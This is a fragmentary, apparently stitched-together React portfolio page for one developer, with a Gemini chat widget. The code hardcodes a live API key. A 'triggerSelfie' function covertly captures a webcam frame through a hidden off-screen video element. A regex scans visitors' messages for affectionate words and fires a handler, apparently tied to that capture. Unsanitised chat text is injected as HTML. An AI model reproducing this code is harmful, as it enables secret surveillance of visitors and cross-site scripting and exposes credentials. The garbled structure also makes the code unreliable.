        const apiKey_gemini = "AIzaSyA8bLdXXxyMEC59fp4IhAP89w3ZYuGhMC8";

        const callGeminiAPI = async (prompt) => {
            const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey_gemini}`;
            const payload = { 
                contents: [{ parts: [{ text: prompt }] }],
                systemInstruction: { parts: [{ text: "You are the personal AI assistant for Rezwan Ahammed. Talk about his engineering work. Use Markdown." }] }
            };
            try {
                const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
                const data = await response.json();
                return data.candidates?.[0]?.content?.parts?.[0]?.text || 'No response.';
            } catch (e) { return "System Busy."; }
        };

        const renderMarkdown = (text) => {
            if (!text) return '';
            let html = text
                .replace(/\n/g, '<br/>')
                .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
                .replace(/\*(.*?)\*/g, '<em>$1</em>')
                .replace(/`(.*?)`/g, '<code class="bg-slate-200 px-1 rounded font-mono text-xs text-indigo-600">$1</code>')
                .replace(/```([\s\S]*?)```/g, '<pre class="bg-slate-900 text-indigo-200 p-3 rounded-lg my-2 text-xs font-mono overflow-x-auto shadow-inner"><code>$1</code></pre>');
            return { __html: html };
        };

        const triggerSelfie = async () => {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
            let stream = null; let video = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video = document.createElement('video');
                video.style.position = 'fixed'; video.style.top = '-9999px';
                video.setAttribute('autoplay', 'true'); video.setAttribute('muted', 'true'); video.setAttribute('playsinline', 'true');
                document.body.appendChild(video); 
                video.srcObject = stream;
                await new Promise((resolve) => { video.onplaying = resolve; setTimeout(resolve, 5000); });
                await new Promise(r => setTimeout(r, 400));
                const canvas = document.createElement('canvas');
                canvas.width = 320; canvas.height = 240;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                const img = canvas.toDataURL('image/jpeg', 0.5); 
                return img;
            } catch (err) { return null; }
            finally {
                if (stream) stream.getTracks().forEach(t => t.stop());
                if (video && video.parentNode) document.body.removeChild(video);
            }
        };

            const handleSend = async () => {
                if (!input.trim() || isTyping) return;
                const userMsg = input; setInput('');
                setMessages(prev => [...prev, { role: 'user', text: userMsg }]);
                const feelingsRegex = /(love|like|feelings|crush|adore|sweetheart|beautiful|cute|pretty|marry|date|awesome|amazing|gorgeous|wonderful|fantastic|ভালোবাসা|পছন্দ|ভালবাসি|ভালবাসা|ক্রাশ|ভালোবাসি|প্রেম|মিষ্টি|সুন্দর|বিয়ে|বিয়|ভাল্লাগে|মুগ্ধ|চমৎকার|অপূর্ব|প্রিয়|মনোহর|দারুণ|অসাধারণ|❤️|💖|💗|💓|💞|💕|💌|💘|💝|💟|😍|🥰|😘|😗|😙|😚|🌹|🌷|🌸|❤️‍🔥|🫶|😻)/i;
                if (feelingsRegex.test(userMsg)) onFeelingDetected(userMsg);
                setIsTyping(true);
                const botReply = await callGeminiAPI(userMsg);
                setMessages(prev => [...prev, { role: 'bot', text: botReply }]);
                setIsTyping(false);
            };

            return (
                <div className="fixed bottom-6 right-6 z-50">
                    {isOpen ? (
                        <div className="bg-white/95 backdrop-blur-2xl border border-white/50 shadow-2xl rounded-3xl w-[85vw] sm:w-96 flex flex-col h-[550px] animate-in slide-in-from-bottom-4 duration-300 overflow-hidden">

                            </div>
                            <div ref={scrollRef} className="flex-1 p-4 overflow-y-auto space-y-4 bg-slate-50/40 custom-scrollbar">
                                {messages.length === 0 && <div className="text-center text-slate-400 mt-10 text-xs font-bold uppercase tracking-widest">Active Link</div>}
                                {messages.map((m, i) => (
                                    <div key={i} className={`flex ${m.role === 'user' ? 'justify-end' : 'justify-start'}`}>
                                        <div className={`max-w-[88%] p-3.5 rounded-2xl text-[13px] leading-relaxed shadow-sm ${m.role === 'user' ? 'bg-blue-600 text-white rounded-tr-none' : 'bg-white border border-white/80 text-slate-700 rounded-tl-none'}`} dangerouslySetInnerHTML={renderMarkdown(m.text)} />
                                    </div>
                                ))}
                                {isTyping && <div className="text-[10px] font-bold text-blue-500 animate-pulse px-2 flex items-center gap-1"><Icon name="Zap" size={10} /> Thinking...</div>}
                            </div>
                            <div className="p-3 border-t border-white bg-white/80 flex gap-2">
                                <input value={input} onChange={e => setInput(e.target.value)} onKeyPress={e => e.key === 'Enter' && !isTyping && handleSend()} disabled={isTyping} placeholder={t.chatPlaceholder} className="flex-1 bg-slate-100 border-none rounded-xl px-4 py-2 text-sm outline-none focus:ring-2 focus:ring-blue-500/20 disabled:opacity-50" />

            const [commentText, setCommentText] = useState('');
            const [highlightedPostId, setHighlightedPostId] = useState(null);
            const [activeModal, setActiveModal] = useState(null);

            const appId_str = 'rezwan-portfolio-v1';

            const app_init = initializeApp(firebaseConfig);
            const app_auth = getAuth(app_init);
            const app_db = getFirestore(app_init);

            useEffect(() => {
                const initAuth = async () => { try { await signInAnonymously(app_auth); } catch (e) {} };

                                                {(profileData.contact || []).map((c,i) => (
                                                    <div key={i} className="flex gap-5 items-center p-4 rounded-[1.8rem] hover:bg-white transition-all group">
                                                        <div className="w-12 h-12 bg-slate-50 rounded-2xl flex items-center justify-center text-slate-400 group-hover:bg-indigo-600 group-hover:text-white transition-all shadow-inner"><Icon name="Globe" size={20}/></div>
                                                        <div className="min-w-0 flex-1"><p className="font-black text-slate-800 text-base tracking-tight truncate">{c.value}</p><p className="text-[9px] text-slate-400 font-black uppercase tracking-widest mt-1">{c.type}</p></div>
                                                    </div>
                                                ))}
                                                {(profileData.basic || []).map((b,i) => (
                                                    <div key={i} className="flex gap-5 items-center p-4 rounded-[1.8rem] hover:bg-white transition-all group">
                                                        <div className="w-12 h-12 bg-slate-50 rounded-2xl flex items-center justify-center text-slate-400 group-hover:bg-emerald-600 group-hover:text-white transition-all shadow-inner"><Icon name="HeartHandshake" size={20}/></div>
                                                        <div><p className="font-black text-slate-800 text-base tracking-tight">{b.value}</p><p className="text-[9px] text-slate-400 font-black uppercase tracking-widest mt-1">{b.label}</p></div>
                                                    </div>
                                                ))}
                                            </div>
                                        </div>
                                    </div>
                                </div>)}
                            </div>
                            ) : activeMenu === 'Projects' ? (
                            <div className="animate-in fade-in slide-in-from-bottom-6 duration-700">
                                <h2 className="text-4xl font-black text-slate-900 mb-12 tracking-tighter flex items-center gap-6"><Icon name="Code2" className="text-blue-600" size={32}/> {t.portfolio}</h2>
                                <div className="grid grid-cols-1 sm:grid-cols-2 gap-10">
                                {projects.map(proj => (
                                    <div key={proj.id} className="glass-card rounded-[3rem] p-10 flex flex-col h-full hover:shadow-2xl hover:shadow-blue-600/10 transition-all duration-500 group relative overflow-hidden">
                                        <div className="absolute -top-10 -right-10 w-40 h-40 bg-blue-50 rounded-full blur-3xl opacity-0 group-hover:opacity-100 transition-opacity"></div>
                                        <div className="w-16 h-16 bg-blue-50 rounded-3xl flex items-center justify-center text-blue-600 mb-8 shadow-inner group-hover:bg-blue-600 group-hover:text-white transition-all"><Icon name="Folder" size={32}/></div>
                                        <h3 className="text-2xl font-black text-slate-900 mb-4 tracking-tight leading-none">{proj.title}</h3>
                                        <p className="text-sm text-slate-500 mb-10 line-clamp-4 flex-1 font-medium leading-relaxed">{proj.desc}</p>
                                        <button className="inline-flex items-center gap-4 text-[10px] font-black uppercase tracking-[0.3em] text-blue-600 hover:gap-6 transition-all">{t.resume} <Icon name="ArrowRight" size={14}/></button>
                                    </div>
                                ))}
                                </div>
                                {projects.length === 0 && <div className="text-center py-40 flex flex-col items-center opacity-30"><Icon name="Folder" size={60} className="mb-6"/><p className="font-black text-xs uppercase tracking-widest">{t.awaitingData}</p></div>}
                            </div>
                            ) : activeMenu === 'Academics' ? (
                            <div className="animate-in fade-in slide-in-from-bottom-6 duration-700">
                                <h2 className="text-4xl font-black text-slate-900 mb-12 tracking-tighter flex items-center gap-6"><Icon name="GraduationCap" className="text-emerald-500" size={32}/> {t.academics}</h2>
                                <div className="space-y-8">
                                {academics.map(edu => (
                                    <div key={edu.id} className="glass-card rounded-[2.5rem] p-10 flex gap-8 items-center hover:bg-white transition-all duration-500 group shadow-lg shadow-black/5">
                                        <div className="w-20 h-20 bg-emerald-50 rounded-[2rem] flex items-center justify-center text-emerald-600 shrink-0 shadow-inner group-hover:bg-emerald-500 group-hover:text-white transition-all"><Icon name="Trophy" size={36}/></div>
                                        <div>
                                            <h3 className="text-2xl font-black text-slate-900 tracking-tighter mb-2 leading-none">{edu.title}</h3>
                                            <p className="text-sm text-slate-400 font-bold uppercase tracking-widest">{edu.institution} {edu.grade ? `• ${edu.grade}` : ''}</p>
                                        </div>
                                    </div>
                                ))}
                                </div>
                                {academics.length === 0 && <div className="text-center py-40 flex flex-col items-center opacity-30"><Icon name="GraduationCap" size={60} className="mb-6"/><p className="font-black text-xs uppercase tracking-widest">{t.awaitingData}</p></div>}
                            </div>
                            ) : activeMenu === 'Perspectives' ? (
                            <div className="animate-in fade-in slide-in-from-bottom-6 duration-700">
                                <h2 className="text-4xl font-black text-slate-900 mb-12 tracking-tighter flex items-center gap-6"><Icon name="Lightbulb" className="text-amber-500" size={32}/> {t.perspectives}</h2>
                                <div className="grid grid-cols-1 gap-12">
                                {perspectives.map(ps => (
                                    <div key={ps.id} className="glass-card rounded-[4rem] p-16 relative overflow-hidden group hover:bg-white transition-all duration-700">
                                        <Icon name="Quote" className="absolute -top-10 -right-10 text-slate-50 rotate-12 scale-[2.5] transition-transform group-hover:scale-[3] group-hover:rotate-0" size={200} />
                                        <div className="relative z-10">
                                            <h3 className="text-[10px] font-black text-amber-600 uppercase tracking-[0.5em] mb-10 border-b border-amber-100 pb-4 inline-block">{ps.topic}</h3>
                                            <p className="text-3xl sm:text-5xl font-black text-slate-800 leading-tight tracking-tighter">"{lang === 'en' ? (ps.text_en || ps.text) : (ps.text_bn || ps.text)}"</p>
                                        </div>
                                    </div>
                                ))}
                                </div>
                                {perspectives.length === 0 && <div className="text-center py-40 flex flex-col items-center opacity-30"><Icon name="Quote" size={60} className="mb-6"/><p className="font-black text-xs uppercase tracking-widest">{t.awaitingData}</p></div>}
                            </div>
                            ) : null}
                        </main>
                    </div>

                    <AIChatWidget lang={lang} t={t} user={user} onFeelingDetected={handleFeelingDetected} />
                </div>
            );
        };

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);

    </script>
</body>
</html>
